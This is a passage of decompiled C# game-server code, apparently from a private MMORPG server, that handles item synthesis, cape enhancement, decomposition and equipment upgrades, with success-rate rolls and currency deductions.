													增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value21), 位置3, BitConverter.GetBytes(1), new byte[56]);
													合成提示(num, 1, 0, 装备栏包裹[num2]);
													合成物品表.Clear();
													合成系统解锁();
													元宝合成开关 = 0;
												}
												else
												{
													合成提示(num, 8, 0, 装备栏包裹[num2]);
												}
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex23)
							{
								string[] obj3 = new string[6]
								{
									"206首饰分解 出错",
									base.Client.WorldId.ToString(),
									"|",
									base.Client.ToString(),
									" ",
									null
								};
								obj3[5] = ((ex23 != null) ? ex23.ToString() : null);
								Form1.WriteLine(1, string.Concat(obj3));
							}
							goto default;
						case 208:
							try
							{
								HcItimesClass value17;
								if (合成物品表.TryGetValue(1, out value17))
								{
									装备栏包裹[value17.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
								}
								元宝合成开关 = 0;
								合成提示(num, 1, 0, 装备栏包裹[num2]);
							}
							catch (Exception ex22)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 首饰分解 208 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex22.Message);
							}
							goto default;
						case 210:
							try
							{
								HcItimesClass value16;
								if (合成物品表.TryGetValue(1, out value16))
								{
									装备栏包裹[value16.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value16.位置]);
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
								}
							}
							catch (Exception ex21)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex21.Message);
							}
							goto default;
						case 211:
							try
							{
								ItmeClass value15;
								if (!装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定 && (base.当前操作类型 == 179 || base.当前操作类型 == 180) && (base.当前操作类型 != 179 || 装备栏包裹[num2].FLD_MAGIC0 < 400000100) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value15) || value15.FLD_RESIDE2 == 12) && !合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass15 = new HcItimesClass();
									hcItimesClass15.位置 = num2;
									hcItimesClass15.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass15);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex20)
							{
								Form1.WriteLine(1, "披风强化 放入披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex20.Message);
							}
							goto default;
						case 212:
							if (合成物品表.Count != 0 && 合成物品表.ContainsKey(1) && 装备栏包裹[num2].Get物品ID == 1000000545L && !合成物品表.ContainsKey(2))
							{
								装备栏包裹[num2].锁定 = true;
								合成物品表.Add(2, new HcItimesClass
								{
									位置 = num2,
									物品 = 装备栏包裹[num2].物品_byte
								});
								合成提示(num, 1, 0, 装备栏包裹[num2]);
							}
							goto default;
						case 213:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex15)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex15.Message);
							}
							goto default;
						case 214:
							try
							{
								if (base.当前操作类型 == 181 && !装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定)
								{
									if (装备栏包裹[num2].FLD_MAGIC0 == 0 && 装备栏包裹[num2].FLD_MAGIC1 == 0 && 装备栏包裹[num2].FLD_MAGIC2 == 0 && 装备栏包裹[num2].FLD_MAGIC3 == 0 && 装备栏包裹[num2].FLD_MAGIC4 == 0)
									{
										ItmeClass value33;
										if (!合成物品表.ContainsKey(0) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value33) || value33.FLD_RESIDE2 == 12))
										{
											HcItimesClass hcItimesClass35 = new HcItimesClass();
											hcItimesClass35.位置 = num2;
											hcItimesClass35.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(0, hcItimesClass35);
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										系统提示("请放置无强化无合成的白披风。");
									}
								}
							}
							catch (Exception ex35)
							{
								Form1.WriteLine(1, "合成系统 披风组合放披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex35.Message);
							}
							goto default;
						case 215:
							try
							{
								if (合成物品表.Count != 0 && !合成物品表.ContainsKey(1))
								{
									ItmeClass value12;
									if (装备栏包裹[num2].FLD_MAGIC0 == 0 && 装备栏包裹[num2].FLD_MAGIC1 == 0 && 装备栏包裹[num2].FLD_MAGIC2 == 0 && 装备栏包裹[num2].FLD_MAGIC3 == 0 && 装备栏包裹[num2].FLD_MAGIC4 == 0)
									{
										系统提示("请放置已合成属性的披风。");
									}
									else if (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value12) || value12.FLD_RESIDE2 == 12)
									{
										HcItimesClass hcItimesClass10 = new HcItimesClass();
										hcItimesClass10.位置 = num2;
										hcItimesClass10.物品 = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].锁定 = true;
										合成物品表.Add(1, hcItimesClass10);
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex14)
							{
								Form1.WriteLine(1, "合成系统 披风组合放属性披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex14.Message);
							}
							goto default;
						case 216:
							try
							{
								ItmeClass value5;
								if (!装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定 && (base.当前操作类型 == 179 || base.当前操作类型 == 180) && (base.当前操作类型 != 179 || 装备栏包裹[num2].FLD_MAGIC0 < 400000100) && (!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value5) || value5.FLD_RESIDE2 == 12) && !合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass5 = new HcItimesClass();
									hcItimesClass5.位置 = num2;
									hcItimesClass5.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass5);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex8)
							{
								Form1.WriteLine(1, "披风强化 放入披风 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex8.Message);
							}
							goto default;
						case 217:
							if (base.当前操作类型 == 179 && 合成物品表.Count > 0 && base.Player_Money >= 500000L)
							{
								合成手续费 = 500000;
								base.Player_Money -= 合成手续费;
								HcItimesClass hcItimesClass74 = null;
								HcItimesClass hcItimesClass75 = null;
								HcItimesClass hcItimesClass76 = null;
								if (合成物品表.ContainsKey(1))
								{
									hcItimesClass74 = 合成物品表[1];
								}
								if (合成物品表.ContainsKey(2))
								{
									hcItimesClass75 = 合成物品表[2];
								}
								if (合成物品表.ContainsKey(3))
								{
									hcItimesClass76 = 合成物品表[3];
								}
								if (BitConverter.ToInt64(装备栏包裹[hcItimesClass74.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass74.物品全局ID, 0) && hcItimesClass75 != null && (hcItimesClass75 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass75.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass75.物品全局ID, 0)) && (hcItimesClass76 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass76.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass76.物品全局ID, 0)))
								{
									hcItimesClass74.得到属性();
									hcItimesClass74.强化属性阶段();
									ItmeClass value69;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass74.物品id, 0), out value69))
									{
										if (value69.FLD_RESIDE2 != 12)
										{
											Form1.WriteLine(6, "合成系统 披风强化 BUG1[" + BitConverter.ToInt32(hcItimesClass74.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass75.物品id, 0) + "]");
										}
										else if (装备栏包裹[hcItimesClass74.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass74.位置]);
										}
										else
										{
											double num55 = RNG.Next(20, 1000);
											double num56 = hcItimesClass74.强化数量 * 10;
											if (hcItimesClass74.强化数量 >= 100)
											{
												合成物品表.Clear();
											}
											else
											{
												if (hcItimesClass76 != null)
												{
													num55 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass76.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num55 += 50.0;
												}
												if (base.FLD_VIP == 1)
												{
													num55 += 1000.0 * World.VIP合成率增加百分比;
												}
												if (World.披风强化率 != 0.0)
												{
													num55 += 1000.0 * World.披风强化率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num55 += 1000.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num55 += 1000.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (num55 >= num56)
												{
													hcItimesClass74.强化类型 = 4;
													int num9 = ++hcItimesClass74.强化数量;
													if (hcItimesClass74.强化数量 > 100)
													{
														hcItimesClass74.强化数量 = 100;
													}
													hcItimesClass74.设置阶段属性();
													if (BitConverter.ToInt32(装备栏包裹[hcItimesClass74.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass74.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass74.物品全局ID, 0))
													{
														减去物品(hcItimesClass74.位置, 1);
														增加物品(hcItimesClass74.物品全局ID, hcItimesClass74.物品id, hcItimesClass74.位置, hcItimesClass74.物品数量, hcItimesClass74.物品属性);
													}
													装备栏包裹[hcItimesClass74.位置].锁定 = false;
													RxjhClass.合成记录(base.Userid, base.UserName, value69.ItmeNAME, num, "披风强化", "成功", 装备栏包裹[hcItimesClass74.位置]);
													合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass74.位置]);
												}
												else
												{
													if (hcItimesClass74.强化数量 >= 4)
													{
														hcItimesClass74.强化类型 = 4;
														hcItimesClass74.强化数量 -= 3;
														hcItimesClass74.设置阶段属性();
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass74.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass74.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass74.物品全局ID, 0))
														{
															减去物品(hcItimesClass74.位置, 1);
															增加物品(hcItimesClass74.物品全局ID, hcItimesClass74.物品id, hcItimesClass74.位置, hcItimesClass74.物品数量, hcItimesClass74.物品属性);
														}
														装备栏包裹[hcItimesClass74.位置].锁定 = false;
													}
													RxjhClass.合成记录(base.Userid, base.UserName, value69.ItmeNAME, num, "披风强化", "失败", 装备栏包裹[hcItimesClass74.位置]);
													合成提示(num, 65513, 合成手续费, 装备栏包裹[hcItimesClass74.位置]);
												}
												更新金钱和负重();
												减去物品(hcItimesClass75.位置, 1);
												if (hcItimesClass76 != null)
												{
													减去物品(hcItimesClass76.位置, 1);
												}
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
												打开仓库中 = true;
												合成手续费 = 0;
											}
										}
									}
								}
							}
							goto default;
						case 218:
							if (base.当前操作类型 == 180)
							{
								int num37 = 得到包裹空位位置();
								if (num37 == -1)
								{
									系统提示("背包没有空位了。");
								}
								else if (合成物品表.Count != 0)
								{
									HcItimesClass hcItimesClass53 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass53 = 合成物品表[1];
									}
									ItmeClass value54;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass53.物品id, 0), out value54))
									{
										if (value54.FLD_RESIDE2 != 12)
										{
											Form1.WriteLine(6, "合成系统 披风强化 BUG1[" + BitConverter.ToInt32(hcItimesClass53.物品id, 0) + "]-[" + base.UserName + "]");
										}
										else
										{
											查百宝阁元宝数();
											if (base.FLD_RXPIONT < World.每次分解消耗元宝数)
											{
												系统提示("元宝不够了,分解披风需要" + World.每次分解消耗元宝数 + "元宝。");
											}
											else
											{
												检察元宝数据(World.每次分解消耗元宝数, 0);
												RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "分解披风消耗", 1, World.每次分解消耗元宝数);
												保存元宝数据();
												int num38 = RNG.Next(1, 100);
												int num39 = (num38 > 0 && num38 <= 50) ? 1 : ((num38 > 50 && num38 <= 70) ? 2 : ((num38 <= 70 || num38 > 90) ? 4 : 3));
												增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(1000000545), num37, BitConverter.GetBytes(num39), new byte[56]);
												合成提示(num, 1, num39, 装备栏包裹[hcItimesClass53.位置]);
												减去物品(hcItimesClass53.位置, 1);
												合成物品表.Clear();
												合成系统解锁();
											}
										}
									}
								}
							}
							goto default;
						case 219:
							try
							{
								if (合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass50 = null;
									HcItimesClass hcItimesClass51 = null;
									HcItimesClass hcItimesClass52 = null;
									if (合成物品表.Count < 3)
									{
										合成提示(num, 0, 0, 装备栏包裹[num2]);
									}
									else
									{
										if (合成物品表.ContainsKey(0))
										{
											hcItimesClass50 = 合成物品表[0];
										}
										if (合成物品表.ContainsKey(1))
										{
											hcItimesClass51 = 合成物品表[1];
										}
										if (合成物品表.ContainsKey(2))
										{
											hcItimesClass52 = 合成物品表[2];
										}
										if (BitConverter.ToInt64(装备栏包裹[hcItimesClass50.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass50.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass51.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass51.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass52.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass52.物品全局ID, 0))
										{
											hcItimesClass51.得到属性();
											hcItimesClass51.强化属性阶段();
											hcItimesClass52.强化属性阶段();
											ItmeClass value52;
											if (装备栏包裹[hcItimesClass50.位置].物品绑定)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass50.位置]);
											}
											else if (装备栏包裹[hcItimesClass51.位置].物品绑定)
											{
												合成提示(num, 2, 0, 装备栏包裹[hcItimesClass50.位置]);
											}
											else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass50.物品id, 0), out value52))
											{
												ItmeClass value53;
												if (value52.FLD_RESIDE2 != 12)
												{
													Form1.WriteLine(6, "合成系统 披风强化BUG[" + BitConverter.ToInt32(hcItimesClass50.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass52.物品id, 0) + "]");
												}
												else if (BitConverter.ToInt32(hcItimesClass52.物品id, 0) != 1000000545)
												{
													Form1.WriteLine(6, "合成系统 披风强化BUG[" + BitConverter.ToInt32(hcItimesClass50.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass52.物品id, 0) + "]");
												}
												else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass50.物品id, 0), out value53))
												{
													if (value53.FLD_RESIDE2 != 12)
													{
														Form1.WriteLine(6, "合成系统 披风强化BUG[" + BitConverter.ToInt32(hcItimesClass51.物品id, 0) + "]");
													}
													else
													{
														hcItimesClass50.强化类型 = 4;
														hcItimesClass50.强化数量 = hcItimesClass51.强化数量;
														if (hcItimesClass50.强化数量 > 100)
														{
															hcItimesClass50.强化数量 = 100;
														}
														hcItimesClass50.设置阶段属性();
														if (BitConverter.ToInt32(装备栏包裹[hcItimesClass50.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass50.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass50.物品全局ID, 0))
														{
															减去物品(hcItimesClass50.位置, 1);
															增加物品(hcItimesClass50.物品全局ID, hcItimesClass50.物品id, hcItimesClass50.位置, hcItimesClass50.物品数量, hcItimesClass51.物品属性);
														}
														装备栏包裹[hcItimesClass50.位置].锁定 = false;
														减去物品(hcItimesClass51.位置, 1);
														减去物品(hcItimesClass52.位置, 1);
														合成物品表.Clear();
														合成系统解锁();
														元宝合成开关 = 0;
														合成提示(num, 1, 0, 装备栏包裹[hcItimesClass50.位置]);
													}
												}
											}
										}
									}
								}
							}
							catch (Exception ex46)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 披风合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex46.Message);
							}
							goto default;
						case 220:
							try
							{
								HcItimesClass value51;
								if (合成物品表.TryGetValue(1, out value51))
								{
									装备栏包裹[value51.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value51.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
							}
							catch (Exception ex45)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex45.Message);
							}
							goto default;
						case 221:
							try
							{
								ItmeClass value50;
								if (!装备栏包裹[num2].锁定 && !装备栏包裹[num2].物品绑定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value50))
								{
									if (value50.FLD_LEVEL < 130)
									{
										系统提示("只有130级以上的武器/衣服/护手/鞋子/内甲才能升真。");
									}
									else if (value50.FLD_UP_LEVEL == 0)
									{
										系统提示("不能升真的装备。");
									}
									else if (value50.FLD_RESIDE2 != 4 && value50.FLD_RESIDE2 != 1 && value50.FLD_RESIDE2 != 2 && value50.FLD_RESIDE2 != 5 && value50.FLD_RESIDE2 != 6)
									{
										系统提示("只有130级以上的武器/衣服/护手/鞋子/内甲才能升真。");
									}
									else if (value50.FLD_RESIDE2 == 6)
									{
										if (装备栏包裹[num2].FLD_MAGIC1 != 0 && 装备栏包裹[num2].FLD_MAGIC2 != 0)
										{
											goto IL_f4bc;
										}
										系统提示("只有合成2阶段的内甲才能升级。");
									}
									else
									{
										if (装备栏包裹[num2].FLD_MAGIC1 != 0 && 装备栏包裹[num2].FLD_MAGIC2 != 0 && 装备栏包裹[num2].FLD_MAGIC3 != 0 && 装备栏包裹[num2].FLD_MAGIC4 != 0)
										{
											goto IL_f4bc;
										}
										系统提示("只有合成4阶段的装备才能升级。");
									}
								}
								goto end_IL_f369;
								IL_f4bc:
								if (!合成物品表.ContainsKey(1))
								{
									int 钱数2 = 合成手续费 = 计算合成强化费用(value50, num2, num);
									HcItimesClass hcItimesClass49 = new HcItimesClass();
									hcItimesClass49.位置 = num2;
									hcItimesClass49.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass49);
									合成提示(num, 1, 钱数2, 装备栏包裹[num2]);
								}
								end_IL_f369:;
							}
							catch (Exception ex44)
							{
								Form1.WriteLine(1, "合成系统 装备升真 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex44.Message);
							}
							goto default;
						case 222:
							try
							{
								if (合成物品表.Count != 0 && 合成物品表.ContainsKey(1))
								{
									HcItimesClass hcItimesClass48 = 合成物品表[1];
									ItmeClass value48;
									ItmeClass value49;
									if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value48) && (value48.FLD_PID == 1000000853 || value48.FLD_PID == 1000000854) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[hcItimesClass48.位置].物品ID, 0), out value49) && (value49.FLD_RESIDE2 != 4 || value48.FLD_PID == 1000000853) && ((value49.FLD_RESIDE2 != 1 && value49.FLD_RESIDE2 != 2 && value49.FLD_RESIDE2 != 5 && value49.FLD_RESIDE2 != 6) || value48.FLD_PID == 1000000854) && !合成物品表.ContainsKey(2))
									{
										合成物品表.Add(2, new HcItimesClass
										{
											位置 = num2,
											物品 = 装备栏包裹[num2].物品_byte
										});
										装备栏包裹[num2].锁定 = true;
										合成提示(num, 1, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex43)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex43.Message);
							}
							goto default;
						case 223:
							try
							{
								if (合成物品表.Count == 0)
								{
									合成提示(num, 5, 0, 装备栏包裹[num2]);
								}
								else if (!合成物品表.ContainsKey(3))
								{
									合成物品表.Add(3, new HcItimesClass
									{
										位置 = num2,
										物品 = 装备栏包裹[num2].物品_byte
									});
									装备栏包裹[num2].锁定 = true;
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex42)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex42.Message);
							}
							goto default;
						case 224:
							try
							{
								HcItimesClass hcItimesClass45;
								HcItimesClass hcItimesClass46;
								HcItimesClass hcItimesClass47;
								ItmeClass value47;
								if (合成物品表.Count > 0)
								{
									hcItimesClass45 = null;
									hcItimesClass46 = null;
									hcItimesClass47 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass45 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass46 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass47 = 合成物品表[3];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass45.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass45.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass46.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass46.物品全局ID, 0) && (hcItimesClass47 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass47.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass47.物品全局ID, 0)))
									{
										hcItimesClass45.得到属性();
										hcItimesClass45.强化属性阶段();
										hcItimesClass46.强化属性阶段();
										if (装备栏包裹[hcItimesClass45.位置].物品绑定)
										{
											合成物品表.Clear();
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass45.物品id, 0), out value47))
										{
											if (value47.FLD_RESIDE2 != 1 && value47.FLD_RESIDE2 != 2 && value47.FLD_RESIDE2 != 4 && value47.FLD_RESIDE2 != 5 && value47.FLD_RESIDE2 != 6)
											{
												合成物品表.Clear();
											}
											else if (hcItimesClass45.强化数量 < 7)
											{
												合成提示(21, 3, 0, 装备栏包裹[hcItimesClass45.位置]);
												合成物品表.Clear();
												系统提示("只有达到7或7以上强化阶段的装备才能升级。");
											}
											else
											{
												switch (World.装备提真消耗)
												{
												default:
													系统提示("系统错误221,请联系管理员。");
													return;
												case 0:
													查百宝阁元宝数();
													if (base.FLD_RXPIONT < World.装备提真数量)
													{
														系统提示("元宝不够了,提真此装备需花费" + World.装备提真数量 + "元宝。");
														return;
													}
													检察元宝数据(World.装备提真数量, 0);
													保存元宝数据();
													break;
												case 1:
													查百宝阁元宝数();
													if (base.FLD_Coin < World.装备提真数量)
													{
														系统提示("元宝不够了,提真此装备需花费" + World.装备提真数量 + "赠品元宝。");
														return;
													}
													检察元宝积分数据(World.装备提真数量, 0);
													保存元宝数据();
													break;
												case 2:
													if (base.Player_Money < World.装备提真数量)
													{
														系统提示("游戏币不够了,提真此装备需花费" + World.装备提真数量 + "两。");
														return;
													}
													base.Player_Money -= World.装备提真数量;
													更新金钱和负重();
													break;
												}
												if (合成手续费 <= 0)
												{
													goto IL_fbaf;
												}
												if (base.Player_Money >= 合成手续费)
												{
													base.Player_Money -= 合成手续费;
													更新金钱和负重();
													goto IL_fbaf;
												}
												合成提示(11, 4, 0, 装备栏包裹[hcItimesClass45.位置]);
												合成物品表.Clear();
											}
										}
										else
										{
											合成物品表.Clear();
										}
									}
								}
								goto end_IL_f843;
								IL_fbaf:
								double num35 = RNG.Next(0, 100);
								double num36 = hcItimesClass45.属性1.数量 * 20 + hcItimesClass45.属性2.数量 * 20 + hcItimesClass45.属性3.数量 * 20 + hcItimesClass45.属性4.数量 * 20 + 10;
								if (value47.FLD_RESIDE2 == 6)
								{
									num36 += 40.0;
								}
								if (hcItimesClass47 != null)
								{
									num35 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass47.物品id, 0));
								}
								if (元宝合成开关 == 1)
								{
									num35 += 5.0;
								}
								if (base.FLD_VIP == 1)
								{
									num35 += 100.0 * World.VIP合成率增加百分比;
								}
								if (World.装备升级率 != 0.0)
								{
									num35 += 100.0 * World.装备升级率;
								}
								if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
								{
									num35 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
								}
								if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
								{
									num35 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
								}
								byte[] 物品ID = hcItimesClass45.物品id;
								byte[] array11 = new byte[World.物品属性大小];
								System.Buffer.BlockCopy(hcItimesClass45.物品属性, 0, array11, 0, World.物品属性大小);
								if (num35 >= num36)
								{
									if ((value47.FLD_RESIDE2 == 6 && value47.FLD_NJ > 0) || value47.FLD_RESIDE2 != 6)
									{
										物品ID = BitConverter.GetBytes(BitConverter.ToInt32(hcItimesClass45.物品id, 0) + 1);
									}
									System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array11, 52, 4);
									RxjhClass.合成记录(base.Userid, base.UserName, value47.ItmeNAME, num, "装备升真", "成功", 装备栏包裹[hcItimesClass45.位置]);
									合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass45.位置]);
								}
								else
								{
									RxjhClass.合成记录(base.Userid, base.UserName, value47.ItmeNAME, num, "装备升真", "失败", 装备栏包裹[hcItimesClass45.位置]);
									合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass45.位置]);
								}
								减去物品(hcItimesClass46.位置, 1);
								if (hcItimesClass47 != null)
								{
									减去物品(hcItimesClass47.位置, 1);
								}
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass45.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass45.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass45.物品全局ID, 0))
								{
									减去物品(hcItimesClass45.位置, 1);
									增加物品(hcItimesClass45.物品全局ID, 物品ID, hcItimesClass45.位置, hcItimesClass45.物品数量, array11);
								}
								装备栏包裹[hcItimesClass45.位置].锁定 = false;
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								合成手续费 = 0;
								end_IL_f843:;
							}
							catch (Exception ex41)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex41.Message);
							}
							goto default;
						case 19:
						case 240:
							try
							{
								HcItimesClass value46;
								if (合成物品表.TryGetValue(1, out value46))
								{
									装备栏包裹[value46.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value46.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
							}
							catch (Exception ex40)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex40.Message);
							}
							goto default;
						case 11:
						case 241:
							try
							{
								if ((base.当前操作类型 == 8 || base.当前操作类型 == 209) && !合成物品表.ContainsKey(1))
								{
									ItmeClass value45;
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue((int)装备栏包裹[num2].Get物品ID, out value45))
									{
										if (value45.FLD_RESIDE2 == 12)
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else if (装备栏包裹[num2].FLD_强化数量 < 15)
										{
											int 钱数 = 合成手续费 = 计算合成强化费用(value45, num2, num);
											HcItimesClass hcItimesClass44 = new HcItimesClass();
											hcItimesClass44.位置 = num2;
											hcItimesClass44.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(1, hcItimesClass44);
											合成提示(num, 1, 钱数, 装备栏包裹[num2]);
										}
									}
								}
							}
							catch (Exception ex39)
							{
								Form1.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex39.Message);
							}
							goto default;
						case 12:
						case 242:
							try
							{
								HcItimesClass hcItimesClass42;
								if ((base.当前操作类型 == 8 || base.当前操作类型 == 209) && !合成物品表.ContainsKey(4))
								{
									if (合成物品表.Count == 0)
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (合成物品表.ContainsKey(1))
									{
										hcItimesClass42 = 合成物品表[1];
										ItmeClass value44;
										if (BitConverter.ToInt32(装备栏包裹[num2].物品数量, 0) >= 1 && World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass42.物品id, 0), out value44))
										{
											if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000006 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 800000060)
											{
												合成提示(num, 7, 0, 装备栏包裹[num2]);
											}
											else if (value44.FLD_LEVEL >= 0 && value44.FLD_LEVEL < 130)
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 800000006)
												{
													goto IL_1030a;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (value44.FLD_LEVEL < 130 || BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 800000060)
												{
													goto IL_1030a;
												}
